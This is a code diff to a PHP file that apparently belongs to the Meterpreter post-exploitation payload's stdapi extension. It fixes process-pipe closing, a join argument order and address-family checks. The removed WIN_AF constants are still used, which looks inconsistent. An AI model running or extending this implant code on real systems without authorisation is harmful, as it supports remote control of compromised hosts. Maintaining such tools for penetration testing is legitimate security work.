@@ -302,11 +302,6 @@ define("ERROR_CONNECTION_ERROR", 10000);
 # eval'd twice
 my_print("Evaling stdapi");
 
-##
-# Windows Constants
-##
-define("WIN_AF_INET", 2);
-define("WIN_AF_INET6", 23);
 
 ##
 # Search Helpers
@@ -456,9 +451,9 @@ function add_stat_buf($path) {
 if (!function_exists('resolve_host')) {
 function resolve_host($hostname, $family) {
     /* requires PHP >= 5 */
-    if ($family == AF_INET) {
+    if ($family == WIN_AF_INET) {
         $dns_family = DNS_A;
-    } elseif ($family == AF_INET6) {
+    } elseif ($family == WIN_AF_INET6) {
         $dns_family = DNS_AAAA;
     } else {
         my_print('invalid family, must be AF_INET or AF_INET6');
@@ -979,7 +974,9 @@ function close_process($proc) {
         # real harm in that, so go ahead and just always make sure they get
         # closed.
         foreach ($proc['pipes'] as $f) {
+          if (is_resource($f)) {
             @fclose($f);
+          }
         }
         if (is_callable('proc_get_status')) {
             $status = proc_get_status($proc['handle']);
@@ -1052,7 +1049,7 @@ function stdapi_sys_process_get_processes($req, &$pkt) {
         # full command line
         array_shift($proc);
         array_shift($proc);
-        $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_PATH, join($proc, " ")));
+        $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_PATH, join(" ", $proc)));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_GROUP, $grp));
     }
     return ERROR_SUCCESS;
@@ -1263,11 +1260,7 @@ function stdapi_net_resolve_host($req, &$pkt) {
     $family_tlv = packet_get_tlv($req, TLV_TYPE_ADDR_TYPE);
     $family = $family['value'];
 
-    if ($family == WIN_AF_INET) {
-        $family = AF_INET;
-    } elseif ($family == WIN_AF_INET6) {
-        $family = AF_INET6;
-    } else {
+    if ($family != WIN_AF_INET && $family != WIN_AF_INET6) {
         my_print('invalid family, must be AF_INET or AF_INET6');
         return ERROR_FAILURE;
     }
@@ -1290,11 +1283,7 @@ function stdapi_net_resolve_hosts($req, &$pkt) {
     $family_tlv = packet_get_tlv($req, TLV_TYPE_ADDR_TYPE);
     $family = $family_tlv['value'];
 
-    if ($family == WIN_AF_INET) {
-        $family = AF_INET;
-    } elseif ($family == WIN_AF_INET6) {
-        $family = AF_INET6;
-    } else {
+    if ($family != WIN_AF_INET && $family != WIN_AF_INET6) {
         my_print('invalid family, must be AF_INET or AF_INET6');
         return ERROR_FAILURE;
     }
@@ -1412,7 +1401,3 @@ function channel_create_stdapi_net_udp_client($req, &$pkt) {
     return ERROR_SUCCESS;
 }
 }
-
-
-
-
